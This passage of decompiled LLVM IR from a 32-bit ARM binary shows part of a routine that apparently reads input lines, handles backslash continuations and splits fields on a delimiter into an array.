  %v6_13338 = load i32, i32* @r5, align 4
  %v9_13338 = load i32, i32* @r6, align 4
  %v12_13338 = load i32, i32* @r7, align 4
  %v15_13338 = load i32, i32* @r8, align 4
  %v18_13338 = load i32, i32* @sb, align 4
  %v21_13338 = load i32, i32* @sl, align 4
  %v24_13338 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1333c = icmp eq i32* %arg1, null
  store i1 %v2_1333c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_1333c, label %dec_label_pc_1364c, label %dec_label_pc_13354

dec_label_pc_13354:                               ; preds = %dec_label_pc_13338
  %v1_13354 = urem i32 %arg3, 256
  store i32 %v1_13354, i32* @sb, align 4
  %v1_13358 = udiv i32 %arg3, 256
  %v3_1335c = urem i32 %v1_13358, 256
  %v3_13360 = mul nuw nsw i32 %v1_13354, 4
  %v1_13368 = or i32 %v3_13360, 1
  %v1_13374 = and i32 %arg3, 131072
  %v1_13378 = add nsw i32 %v1_13354, -1
  %v1_13384 = and i32 %arg3, 262144
  store i32 %v1_13384, i32* %r2.global-to-local, align 4
  %v1_13388 = and i32 %arg3, 65536
  store i32 %v1_13388, i32* %r3.global-to-local, align 4
  store i32 %v1_13388, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_13398 = add i32 %arg4, 1
  store i32 %v1_13398, i32* @sl, align 4
  %v2_13518 = inttoptr i32 %arg2 to i32*
  %v2_13528 = icmp eq i32 %v1_13374, 0
  %v2_13580 = icmp eq i32 %v1_13384, 0
  br label %dec_label_pc_1339c

dec_label_pc_1339c:                               ; preds = %dec_label_pc_1339c.backedge, %dec_label_pc_13354
  %v2_133b8 = phi i32 [ %v0_1339c.pre, %dec_label_pc_1339c.backedge ], [ %tmp, %dec_label_pc_13354 ]
  %v1_1339c = add i32 %v2_133b8, 4
  %v2_1339c = inttoptr i32 %v1_1339c to i32*
  %v3_1339c = load i32, i32* %v2_1339c, align 4
  store i32 %v3_1339c, i32* %r3.global-to-local, align 4
  %v2_133a0 = icmp eq i32 %v3_1339c, 0
  store i1 %v2_133a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_133a0, label %dec_label_pc_133a8, label %dec_label_pc_133f0

dec_label_pc_133a8:                               ; preds = %dec_label_pc_1339c
  %v1_133a8 = add i32 %v2_133b8, 16
  %v2_133a8 = inttoptr i32 %v1_133a8 to i32*
  %v3_133a8 = load i32, i32* %v2_133a8, align 4
  store i32 %v3_133a8, i32* %r3.global-to-local, align 4
  %v2_133ac = icmp eq i32 %v3_133a8, 0
  store i1 %v2_133ac, i1* %cpsr_z.global-to-local, align 1
  %v1_133b0 = add i32 %v2_133b8, 8
  %v2_133b0 = inttoptr i32 %v1_133b0 to i32*
  %v3_133b0 = load i32, i32* %v2_133b0, align 4
  store i32 %v3_133b0, i32* %r3.global-to-local, align 4
  br i1 %v2_133ac, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_133a8
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_133a8, align 4
  %v0_133bc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_133a8, %bb
  %v0_133bc = phi i32 [ %v0_133bc.pre, %bb ], [ %v3_133b0, %dec_label_pc_133a8 ]
  %v2_133bc = icmp eq i32 %v0_133bc, 0
  store i1 %v2_133bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_133bc, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_13368, i32* %r3.global-to-local, align 4
  %v2_133c4 = load i32, i32* @r5, align 4
  %v3_133c4 = add i32 %v2_133c4, 8
  %v4_133c4 = inttoptr i32 %v3_133c4 to i32*
  store i32 %v1_13368, i32* %v4_133c4, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_133c8 = load i32, i32* @r5, align 4
  %v1_133c8 = add i32 %v0_133c8, 16
  %v2_133c8 = inttoptr i32 %v1_133c8 to i32*
  %v3_133c8 = load i32, i32* %v2_133c8, align 4
  store i32 %v3_133c8, i32* %r0.global-to-local, align 4
  %v1_133cc = add i32 %v0_133c8, 8
  %v2_133cc = inttoptr i32 %v1_133cc to i32*
  %v3_133cc = load i32, i32* %v2_133cc, align 4
  store i32 %v3_133cc, i32* %r3.global-to-local, align 4
  %v2_133d0 = add i32 %v3_133cc, %v3_133c8
  store i32 %v2_133d0, i32* %r0.global-to-local, align 4
  %v1_133d4 = call i32 @function_10110(i32 %v2_133d0)
  store i32 %v1_133d4, i32* %r0.global-to-local, align 4
  %v2_133d8 = icmp eq i32 %v1_133d4, 0
  store i1 %v2_133d8, i1* %cpsr_z.global-to-local, align 1
  %v1_133dc = load i32, i32* @r5, align 4
  %v2_133dc = add i32 %v1_133dc, 4
  %v3_133dc = inttoptr i32 %v2_133dc to i32*
  store i32 %v1_133d4, i32* %v3_133dc, align 4
  br i1 %v2_133d8, label %dec_label_pc_1364c, label %dec_label_pc_133e4

dec_label_pc_133e4:                               ; preds = %.thread
  %v0_133e4 = load i32, i32* @r5, align 4
  %v1_133e4 = add i32 %v0_133e4, 20
  %v2_133e4 = inttoptr i32 %v1_133e4 to i32*
  %v3_133e4 = load i32, i32* %v2_133e4, align 4
  %v1_133e8 = or i32 %v3_133e4, 1
  store i32 %v1_133e8, i32* %r3.global-to-local, align 4
  store i32 %v1_133e8, i32* %v2_133e4, align 4
  %v0_133f0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_133f0

dec_label_pc_133f0:                               ; preds = %dec_label_pc_1339c, %dec_label_pc_133e4
  %v1_133f8 = phi i32 [ %v2_133b8, %dec_label_pc_1339c ], [ %v0_133f0.pre, %dec_label_pc_133e4 ]
  %v1_133f0 = add i32 %v1_133f8, 4
  %v2_133f0 = inttoptr i32 %v1_133f0 to i32*
  %v3_133f0 = load i32, i32* %v2_133f0, align 4
  store i32 %v3_133f0, i32* %r2.global-to-local, align 4
  %v4_133f0 = add i32 %v1_133f8, 8
  %v5_133f0 = inttoptr i32 %v4_133f0 to i32*
  %v6_133f0 = load i32, i32* %v5_133f0, align 4
  %v2_133f4 = add i32 %v6_133f0, %v3_133f0
  store i32 %v2_133f4, i32* %r3.global-to-local, align 4
  %v2_133f8 = add i32 %v1_133f8, 12
  %v3_133f8 = inttoptr i32 %v2_133f8 to i32*
  store i32 %v2_133f4, i32* %v3_133f8, align 4
  %v0_133fc = load i32, i32* @fp, align 4
  store i32 %v0_133fc, i32* @r6, align 4
  br label %dec_label_pc_13400

dec_label_pc_13400:                               ; preds = %dec_label_pc_1348c, %dec_label_pc_13478, %dec_label_pc_133f0
  %v0_13408 = phi i32 [ %v0_133fc, %dec_label_pc_133f0 ], [ %v1_13478, %dec_label_pc_13478 ], [ %v0_13408.pre.pre, %dec_label_pc_1348c ]
  %v0_13400 = load i32, i32* @r5, align 4
  %v1_13400 = add i32 %v0_13400, 12
  store i32 %v1_13400, i32* %r0.global-to-local, align 4
  %v1_13404 = inttoptr i32 %v1_13400 to i32*
  %v2_13404 = load i32, i32* %v1_13404, align 4
  store i32 %v2_13404, i32* %r0.global-to-local, align 4
  %v3_13404 = add i32 %v0_13400, 16
  %v4_13404 = inttoptr i32 %v3_13404 to i32*
  %v5_13404 = load i32, i32* %v4_13404, align 4
  %v2_13408 = add i32 %v2_13404, %v0_13408
  store i32 %v2_13408, i32* %r0.global-to-local, align 4
  %v2_1340c = sub i32 %v5_13404, %v0_13408
  %v1_13410 = inttoptr i32 %v0_13400 to i32*
  %v2_13410 = load i32, i32* %v1_13410, align 4
  store i32 %v2_13410, i32* %r2.global-to-local, align 4
  %v3_13414 = call i32 @function_ed48(i32 %v2_13408, i32 %v2_1340c, i32 %v2_13410)
  store i32 %v3_13414, i32* %r0.global-to-local, align 4
  store i32 %v3_13414, i32* %r4.global-to-local, align 4
  %v2_13418 = icmp eq i32 %v3_13414, 0
  store i1 %v2_13418, i1* %cpsr_z.global-to-local, align 1
  %v0_13420 = load i32, i32* @r5, align 4
  %v1_13420 = add i32 %v0_13420, 12
  br i1 %v2_13418, label %dec_label_pc_13420, label %dec_label_pc_13438

dec_label_pc_13420:                               ; preds = %dec_label_pc_13400
  store i32 %v1_13420, i32* %r0.global-to-local, align 4
  %v1_13424 = inttoptr i32 %v1_13420 to i32*
  %v2_13424 = load i32, i32* %v1_13424, align 4
  store i32 %v2_13424, i32* %r0.global-to-local, align 4
  %v3_13424 = add i32 %v0_13420, 16
  %v4_13424 = inttoptr i32 %v3_13424 to i32*
  %v5_13424 = load i32, i32* %v4_13424, align 4
  store i32 %v5_13424, i32* @r2, align 4
  %v2_1342c = inttoptr i32 %v2_13424 to i8*
  %v3_1342c = call i32 @function_f5d0(i8* %v2_1342c, i32 0)
  store i32 %v3_1342c, i32* %r0.global-to-local, align 4
  %v0_13430 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13650

dec_label_pc_13438:                               ; preds = %dec_label_pc_13400
  %v2_13438 = inttoptr i32 %v1_13420 to i32*
  %v3_13438 = load i32, i32* %v2_13438, align 4
  store i32 %v3_13438, i32* @r4, align 4
  %v1_1343c = load i32, i32* @r6, align 4
  %v2_1343c = add i32 %v1_1343c, %v3_13438
  store i32 %v2_1343c, i32* @r0, align 4
  %v0_13440 = call i32 @function_f670()
  %v0_13448 = load i32, i32* @r6, align 4
  %v2_13448 = add i32 %v0_13448, %v0_13440
  store i32 %v2_13448, i32* @r6, align 4
  %v0_1344c = load i32, i32* @r4, align 4
  store i32 %v0_1344c, i32* @r0, align 4
  %v2_13450 = call i32 @function_15078(i32 %v0_1344c, i32 10)
  store i32 %v2_13450, i32* %r0.global-to-local, align 4
  %v2_13454 = icmp eq i32 %v2_13450, 0
  store i1 %v2_13454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13454, label %dec_label_pc_13480, label %dec_label_pc_1345c

dec_label_pc_1345c:                               ; preds = %dec_label_pc_13438
  %v1_1345c = inttoptr i32 %v2_13450 to i8*
  %v2_1345c = load i8, i8* %v1_1345c, align 1
  %v3_1345c = zext i8 %v2_1345c to i32
  %v1_13460 = add nuw nsw i32 %v3_1345c, 255
  %v1_13464 = urem i32 %v1_13460, 256
  store i32 %v1_13464, i32* %r3.global-to-local, align 4
  %v7_13468 = icmp eq i32 %v1_13464, 92
  store i1 %v7_13468, i1* %cpsr_z.global-to-local, align 1
  %v1_1346c = trunc i32 %v1_13460 to i8
  store i8 %v1_1346c, i8* %v1_1345c, align 1
  %v0_13470 = load i32, i32* @r6, align 4
  %v1_13470 = add i32 %v0_13470, -1
  store i32 %v1_13470, i32* @r6, align 4
  %v0_13474 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13474, label %dec_label_pc_13478, label %dec_label_pc_13504

dec_label_pc_13478:                               ; preds = %dec_label_pc_1345c
  %v1_13478 = add i32 %v0_13470, -2
  store i32 %v1_13478, i32* @r6, align 4
  br label %dec_label_pc_13400

dec_label_pc_13480:                               ; preds = %dec_label_pc_13438
  %v0_13480 = load i32, i32* @r5, align 4
  %v1_13480 = add i32 %v0_13480, 20
  %v2_13480 = inttoptr i32 %v1_13480 to i32*
  %v3_13480 = load i32, i32* %v2_13480, align 4
  store i32 %v3_13480, i32* %r3.global-to-local, align 4
  %v2_13484 = icmp eq i32 %v3_13480, 0
  store i1 %v2_13484, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13484, label %dec_label_pc_134bc, label %dec_label_pc_1348c

dec_label_pc_1348c:                               ; preds = %dec_label_pc_13480
  %v1_1348c = add i32 %v0_13480, 16
  %v2_1348c = inttoptr i32 %v1_1348c to i32*
  %v3_1348c = load i32, i32* %v2_1348c, align 4
  store i32 %v3_1348c, i32* %r3.global-to-local, align 4
  %v1_13490 = add i32 %v0_13480, 8
  %v2_13490 = inttoptr i32 %v1_13490 to i32*
  %v3_13490 = load i32, i32* %v2_13490, align 4
  %v1_13494 = add i32 %v3_1348c, 4096
  store i32 %v1_13494, i32* %r3.global-to-local, align 4
  %v2_13498 = add i32 %v3_13490, %v1_13494
  store i32 %v1_13494, i32* %v2_1348c, align 4
  %v0_134a0 = load i32, i32* @r5, align 4
  %v1_134a0 = add i32 %v0_134a0, 4
  %v2_134a0 = inttoptr i32 %v1_134a0 to i32*
  %v3_134a0 = load i32, i32* %v2_134a0, align 4
  store i32 %v3_134a0, i32* %r0.global-to-local, align 4
  %v2_134a4 = inttoptr i32 %v3_134a0 to i32*
  %v3_134a4 = call i32 @function_10a30(i32* %v2_134a4, i32 %v2_13498)
  store i32 %v3_134a4, i32* %r0.global-to-local, align 4
  %v0_134a8 = load i32, i32* @r5, align 4
  %v1_134a8 = add i32 %v0_134a8, 8
  %v2_134a8 = inttoptr i32 %v1_134a8 to i32*
  %v3_134a8 = load i32, i32* %v2_134a8, align 4
  %v2_134ac = add i32 %v3_134a8, %v3_134a4
  store i32 %v2_134ac, i32* %r3.global-to-local, align 4
  %v2_134b0 = add i32 %v0_134a8, 12
  %v3_134b0 = inttoptr i32 %v2_134b0 to i32*
  store i32 %v2_134ac, i32* %v3_134b0, align 4
  %v1_134b4 = load i32, i32* @r5, align 4
  %v2_134b4 = add i32 %v1_134b4, 4
  %v3_134b4 = inttoptr i32 %v2_134b4 to i32*
  store i32 %v3_134a4, i32* %v3_134b4, align 4
  %v0_13408.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13400

dec_label_pc_134bc:                               ; preds = %dec_label_pc_13480, %.dec_label_pc_134bc_crit_edge
  %v0_134bc = phi i32 [ %v0_134bc.pre, %.dec_label_pc_134bc_crit_edge ], [ %v0_13480, %dec_label_pc_13480 ]
  %v1_134bc = inttoptr i32 %v0_134bc to i32*
  %v2_134bc = load i32, i32* %v1_134bc, align 4
  %v1_134c0 = add i32 %v2_134bc, 52
  %v2_134c0 = inttoptr i32 %v1_134c0 to i32*
  %v3_134c0 = load i32, i32* %v2_134c0, align 4
  store i32 %v3_134c0, i32* %r3.global-to-local, align 4
  %v2_134c4 = icmp eq i32 %v3_134c0, 0
  store i1 %v2_134c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_134c4, label %dec_label_pc_134f0, label %dec_label_pc_134cc

dec_label_pc_134cc:                               ; preds = %dec_label_pc_134bc
  %v1_134cc = add i32 %v2_134bc, 16
  %v2_134cc = inttoptr i32 %v1_134cc to i32*
  %v3_134cc = load i32, i32* %v2_134cc, align 4
  store i32 %v3_134cc, i32* %r2.global-to-local, align 4
  %v1_134d0 = add i32 %v2_134bc, 24
  %v2_134d0 = inttoptr i32 %v1_134d0 to i32*
  %v3_134d0 = load i32, i32* %v2_134d0, align 4
  store i32 %v3_134d0, i32* %r3.global-to-local, align 4
  %v3_134d4 = icmp ult i32 %v3_134cc, %v3_134d0
  %v9_134d4 = icmp eq i32 %v3_134cc, %v3_134d0
  store i1 %v9_134d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_134d4, label %dec_label_pc_134f8thread-pre-split, label %dec_label_pc_134e4

dec_label_pc_134e4:                               ; preds = %dec_label_pc_134cc
  store i32 %v2_134bc, i32* %r0.global-to-local, align 4
  %v1_134e8 = inttoptr i32 %v2_134bc to i16*
  %v2_134e8 = call i32 @function_145cc(i16* %v1_134e8)
  store i32 %v2_134e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_134f8

dec_label_pc_134f0:                               ; preds = %dec_label_pc_134bc
  store i32 %v2_134bc, i32* %r0.global-to-local, align 4
  %v1_134f4 = call i32 @function_144f0(i32 %v2_134bc)
  store i32 %v1_134f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_134f8

dec_label_pc_134f8thread-pre-split:               ; preds = %dec_label_pc_134cc
  %v2_134d8 = inttoptr i32 %v3_134cc to i8*
  %v3_134d8 = load i8, i8* %v2_134d8, align 1
  %v4_134d8 = zext i8 %v3_134d8 to i32
  store i32 %v4_134d8, i32* %r0.global-to-local, align 4
  %v6_134d8 = add i32 %v3_134cc, 1
  store i32 %v6_134d8, i32* %r2.global-to-local, align 4
  store i32 %v6_134d8, i32* %v2_134cc, align 4
  %v0_134f8.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_134f8

dec_label_pc_134f8:                               ; preds = %dec_label_pc_134f8thread-pre-split, %dec_label_pc_134e4, %dec_label_pc_134f0
  %v1_134fc = phi i32 [ %v0_134f8.pr, %dec_label_pc_134f8thread-pre-split ], [ %v2_134e8, %dec_label_pc_134e4 ], [ %v1_134f4, %dec_label_pc_134f0 ]
  %v7_134f8 = icmp eq i32 %v1_134fc, 10
  store i1 %v7_134f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_134f8, label %dec_label_pc_13504.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_134f8
  %v8_134fc = icmp eq i32 %v1_134fc, -1
  store i1 %v8_134fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_134fc, label %dec_label_pc_13504.loopexit, label %.dec_label_pc_134bc_crit_edge

.dec_label_pc_134bc_crit_edge:                    ; preds = %bb68
  %v0_134bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_134bc

dec_label_pc_13504.loopexit:                      ; preds = %bb68, %dec_label_pc_134f8
  %v0_13504.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13504

dec_label_pc_13504:                               ; preds = %dec_label_pc_1345c, %dec_label_pc_13504.loopexit
  %v0_13504 = phi i32 [ %v0_13504.pre, %dec_label_pc_13504.loopexit ], [ %v1_13470, %dec_label_pc_1345c ]
  %v7_13504 = icmp eq i32 %v0_13504, -1
  store i1 %v7_13504, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13504, label %dec_label_pc_1364c, label %dec_label_pc_1350c

dec_label_pc_1350c:                               ; preds = %dec_label_pc_13504
  %v0_1350c = load i32, i32* @r5, align 4
  %v1_1350c = add i32 %v0_1350c, 4
  %v2_1350c = inttoptr i32 %v1_1350c to i32*
  %v3_1350c = load i32, i32* %v2_1350c, align 4
  store i32 %v3_1350c, i32* %r0.global-to-local, align 4
  store i32 %v3_13360, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_1350c, i32* %v2_13518, align 4
  %v0_1351c = load i32, i32* @fp, align 4
  %v2_13520 = inttoptr i32 %v3_1350c to i8*
  %v3_13520 = call i32 @function_f5d0(i8* %v2_13520, i32 %v0_1351c)
  store i32 %v3_13520, i32* %r0.global-to-local, align 4
  store i32 %v1_13374, i32* %r2.global-to-local, align 4
  store i1 %v2_13528, i1* %cpsr_z.global-to-local, align 1
  %v0_1352c = load i32, i32* @r5, align 4
  %v1_1352c = add i32 %v0_1352c, 12
  %v2_1352c = inttoptr i32 %v1_1352c to i32*
  %v3_1352c = load i32, i32* %v2_1352c, align 4
  store i32 %v3_1352c, i32* @r4, align 4
  br i1 %v2_13528, label %dec_label_pc_13544, label %dec_label_pc_13534

dec_label_pc_13534:                               ; preds = %dec_label_pc_1350c
  store i32 %v3_1352c, i32* @r0, align 4
  %v1_1353c = inttoptr i32 %v3_1352c to i8*
  %v2_1353c = call i32 @function_14ecc(i8* %v1_1353c)
  store i32 %v2_1353c, i32* %r0.global-to-local, align 4
  %v0_13540 = load i32, i32* @r4, align 4
  %v2_13540 = add i32 %v0_13540, %v2_1353c
  store i32 %v2_13540, i32* @r4, align 4
  br label %dec_label_pc_13544

dec_label_pc_13544:                               ; preds = %dec_label_pc_1350c, %dec_label_pc_13534
  %v0_1361c13 = phi i32 [ %v3_1352c, %dec_label_pc_1350c ], [ %v2_13540, %dec_label_pc_13534 ]
  %v1_13544 = inttoptr i32 %v0_1361c13 to i8*
  %v2_13544 = load i8, i8* %v1_13544, align 1
  %v3_13544 = zext i8 %v2_13544 to i32
  store i32 %v3_13544, i32* %r2.global-to-local, align 4
  %v2_13548 = icmp eq i8 %v2_13544, 0
  store i1 %v2_13548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13548, label %dec_label_pc_1339c.backedge, label %dec_label_pc_13550

dec_label_pc_1339c.backedge:                      ; preds = %dec_label_pc_13544, %dec_label_pc_13644, %dec_label_pc_13550
  %v0_1339c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1339c

dec_label_pc_13550:                               ; preds = %dec_label_pc_13544
  %v0_13550 = load i32, i32* @r7, align 4
  %v1_13550 = inttoptr i32 %v0_13550 to i8*
  %v2_13550 = load i8, i8* %v1_13550, align 1
  %v3_13550 = zext i8 %v2_13550 to i32
  store i32 %v3_13550, i32* %r3.global-to-local, align 4
  %v9_13554 = icmp eq i8 %v2_13550, %v2_13544
  store i1 %v9_13554, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13554, label %dec_label_pc_1339c.backedge, label %dec_label_pc_1361c.preheader

dec_label_pc_1361c.preheader:                     ; preds = %dec_label_pc_13550
  %v1_13558 = load i32, i32* @fp, align 4
  store i32 %v1_13558, i32* @r6, align 4
  %v2_1361c15 = load i8, i8* %v1_13544, align 1
  %v3_1361c16 = zext i8 %v2_1361c15 to i32
  store i32 %v3_1361c16, i32* %r2.global-to-local, align 4
  %v2_1362017 = icmp eq i8 %v2_1361c15, 0
  store i1 %v2_1362017, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1362017, label %dec_label_pc_13638, label %dec_label_pc_13628.preheader

dec_label_pc_13628.preheader:                     ; preds = %dec_label_pc_1361c.preheader
  %v2_1362882 = load i8, i8* %v1_13550, align 1
  %v3_1362883 = zext i8 %v2_1362882 to i32
  store i32 %v3_1362883, i32* %r3.global-to-local, align 4
  %v9_1362c86 = icmp eq i8 %v2_1362882, %v2_1361c15
  store i1 %v9_1362c86, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1362c86, label %dec_label_pc_13638, label %bb74

dec_label_pc_13564:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_13568 = load i32, i32* %v2_13518, align 4
  store i32 %v2_13568, i32* %r3.global-to-local, align 4
  store i32 %v1_13378, i32* %r2.global-to-local, align 4
  %v9_13570 = icmp eq i32 %v2_1357488, %v1_13378
  store i1 %v9_13570, i1* %cpsr_z.global-to-local, align 1
  %v5_13574 = mul i32 %v2_1357488, 4
  %v6_13574 = add i32 %v2_13568, %v5_13574
  %v7_13574 = inttoptr i32 %v6_13574 to i32*
  store i32 %v0_1357487, i32* %v7_13574, align 4
  br i1 %v9_13570, label %dec_label_pc_1357c, label %dec_label_pc_13588

dec_label_pc_1357c:                               ; preds = %dec_label_pc_13564
  store i32 %v1_13384, i32* %r3.global-to-local, align 4
  store i1 %v2_13580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13580, label %dec_label_pc_13588, label %dec_label_pc_135a8

dec_label_pc_13588:                               ; preds = %dec_label_pc_1357c, %dec_label_pc_13564
  %v0_13588 = load i32, i32* @r7, align 4
  %v1_13588 = inttoptr i32 %v0_13588 to i8*
  %v2_13588 = load i8, i8* %v1_13588, align 1
  %v3_13588 = zext i8 %v2_13588 to i32
  store i32 %v3_13588, i32* %r3.global-to-local, align 4
  %v2_1358c = icmp eq i8 %v2_13588, 0
  store i1 %v2_1358c, i1* %cpsr_z.global-to-local, align 1
  %v0_13590 = load i32, i32* @r4, align 4
  store i32 %v0_13590, i32* @r0, align 4
  %v1_13594 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_1358c, i32 %v1_13594, i32 %v0_13588
  store i32 %storemerge, i32* @r1, align 4
  %v0_1359c = call i32 @function_14cf8()
  store i32 %v0_1359c, i32* %r0.global-to-local, align 4
  %v0_135a0 = load i32, i32* @r4, align 4
  %v2_135a0 = add i32 %v0_135a0, %v0_1359c
  store i32 %v2_135a0, i32* @r4, align 4
  br label %dec_label_pc_135e0

dec_label_pc_135a8:                               ; preds = %dec_label_pc_1357c
  %v0_135a8 = load i32, i32* @r4, align 4
  store i32 %v0_135a8, i32* @r0, align 4
  %v0_135ac = load i32, i32* @r7, align 4
  %v1_135ac = inttoptr i32 %v0_135ac to i8*
  %v2_135ac = load i8, i8* %v1_135ac, align 1
  %v3_135ac = zext i8 %v2_135ac to i32
  %v5_135b0 = call i32 @function_14f8c(i32 %v0_135a8, i32 %v3_135ac, i32 %v1_13378, i32 %v1_13384)
  store i32 %v5_135b0, i32* %r0.global-to-local, align 4
  store i32 %v1_13374, i32* %r2.global-to-local, align 4
  store i1 %v2_13528, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_135b0, i32* @r4, align 4
  br i1 %v2_13528, label %dec_label_pc_135e0, label %dec_label_pc_135cc

dec_label_pc_135c8:                               ; preds = %dec_label_pc_135cc
  %v1_135c8 = add i32 %v0_135e0.pre, -1
  store i32 %v1_135c8, i32* @r4, align 4
  br label %dec_label_pc_135cc

dec_label_pc_135cc:                               ; preds = %dec_label_pc_135a8, %dec_label_pc_135c8
  %v0_135cc = phi i32 [ %v1_135c8, %dec_label_pc_135c8 ], [ %v5_135b0, %dec_label_pc_135a8 ]
  %v1_135cc = add i32 %v0_135cc, -1
  %v2_135cc = inttoptr i32 %v1_135cc to i8*
  %v3_135cc = load i8, i8* %v2_135cc, align 1
  %v4_135cc = zext i8 %v3_135cc to i32
  %v0_135d0 = load i32, i32* @sl, align 4
  store i32 %v0_135d0, i32* @r0, align 4
  %v2_135d4 = call i32 @function_15078(i32 %v0_135d0, i32 %v4_135cc)
  store i32 %v2_135d4, i32* %r0.global-to-local, align 4
  %v2_135d8 = icmp eq i32 %v2_135d4, 0
  store i1 %v2_135d8, i1* %cpsr_z.global-to-local, align 1
  %v0_135e0.pre = load i32, i32* @r4, align 4
  br i1 %v2_135d8, label %dec_label_pc_135e0, label %dec_label_pc_135c8

dec_label_pc_135e0:                               ; preds = %dec_label_pc_135cc, %dec_label_pc_135a8, %dec_label_pc_13588
  %v3_135ec = phi i32 [ %v5_135b0, %dec_label_pc_135a8 ], [ %v2_135a0, %dec_label_pc_13588 ], [ %v0_135e0.pre, %dec_label_pc_135cc ]
  %v1_135e0 = inttoptr i32 %v3_135ec to i8*
  %v2_135e0 = load i8, i8* %v1_135e0, align 1
  %v3_135e0 = zext i8 %v2_135e0 to i32
  store i32 %v3_135e0, i32* %r2.global-to-local, align 4
  %v0_135e4 = load i32, i32* @r7, align 4
  %v1_135e4 = inttoptr i32 %v0_135e4 to i8*
  %v2_135e4 = load i8, i8* %v1_135e4, align 1
  %v3_135e4 = zext i8 %v2_135e4 to i32
  store i32 %v3_135e4, i32* %r3.global-to-local, align 4
  %v9_135e8 = icmp eq i8 %v2_135e4, %v2_135e0
  store i1 %v9_135e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_135e8, label %bb71, label %dec_label_pc_135f4

bb71:                                             ; preds = %dec_label_pc_135e0
  %v1_135ec = load i32, i32* @fp, align 4
  %v2_135ec = trunc i32 %v1_135ec to i8
  store i8 %v2_135ec, i8* %v1_135e0, align 1
  %v0_135f0.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_135f0.pr, label %bb73, label %.dec_label_pc_135f4_crit_edge

.dec_label_pc_135f4_crit_edge:                    ; preds = %bb71
  %v0_135f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_135f4

dec_label_pc_135f4:                               ; preds = %.dec_label_pc_135f4_crit_edge, %dec_label_pc_135e0
  %v0_135f4 = phi i32 [ %v0_135f4.pre, %.dec_label_pc_135f4_crit_edge ], [ %v3_135e0, %dec_label_pc_135e0 ]
  %v2_135f4 = icmp eq i32 %v0_135f4, 0
  store i1 %v2_135f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_135f4, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_135f4
  %v1_135f8 = load i32, i32* @fp, align 4
  %v2_135f8 = trunc i32 %v1_135f8 to i8
  %v3_135f8 = load i32, i32* @r4, align 4
  %v4_135f8 = inttoptr i32 %v3_135f8 to i8*
  store i8 %v2_135f8, i8* %v4_135f8, align 1
  %v5_135f8 = load i32, i32* @r4, align 4
  %v6_135f8 = add i32 %v5_135f8, 1
  store i32 %v6_135f8, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_135f4, %bb72
  %v2_135fc = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_135fc, i32* %r3.global-to-local, align 4
  %v2_13600 = icmp eq i32 %v2_135fc, 0
  store i1 %v2_13600, i1* %cpsr_z.global-to-local, align 1
  %v0_1361c.pre = load i32, i32* @r4, align 4
  br i1 %v2_13600, label %dec_label_pc_13618, label %dec_label_pc_13608

dec_label_pc_13608:                               ; preds = %bb73
  store i32 %v0_1361c.pre, i32* @r0, align 4
  %v1_13610 = inttoptr i32 %v0_1361c.pre to i8*
  %v2_13610 = call i32 @function_14ecc(i8* %v1_13610)
  store i32 %v2_13610, i32* %r0.global-to-local, align 4
  %v0_13614 = load i32, i32* @r4, align 4
  %v2_13614 = add i32 %v0_13614, %v2_13610
  store i32 %v2_13614, i32* @r4, align 4
  br label %dec_label_pc_13618

dec_label_pc_13618:                               ; preds = %bb73, %dec_label_pc_13608
  %v0_1361c = phi i32 [ %v2_13614, %dec_label_pc_13608 ], [ %v0_1361c.pre, %bb73 ]
  %v0_13618 = load i32, i32* @r6, align 4
  %v1_13618 = add i32 %v0_13618, 1
  store i32 %v1_13618, i32* @r6, align 4
  %v1_1361c = inttoptr i32 %v0_1361c to i8*
  %v2_1361c = load i8, i8* %v1_1361c, align 1
  %v3_1361c = zext i8 %v2_1361c to i32
  store i32 %v3_1361c, i32* %r2.global-to-local, align 4
